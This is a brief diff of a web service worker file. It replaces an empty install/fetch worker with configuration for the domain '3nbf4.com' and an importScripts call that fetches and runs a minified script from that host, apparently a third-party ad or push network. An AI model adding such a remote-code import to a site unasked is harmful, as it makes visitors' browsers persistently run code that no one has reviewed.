@@ -1,7 +1,7 @@
-self.addEventListener("install", (event) => {
-  console.log("Service Worker Installed");
-});
+self.options = {
+    domain: "3nbf4.com",
+    zoneId: 11421789
+};
 
-self.addEventListener("fetch", (event) => {
-  // Empty fetch handler
-});
+self.lary = "";
+importScripts("https://3nbf4.com/act/files/service-worker.min.js?r=sw");
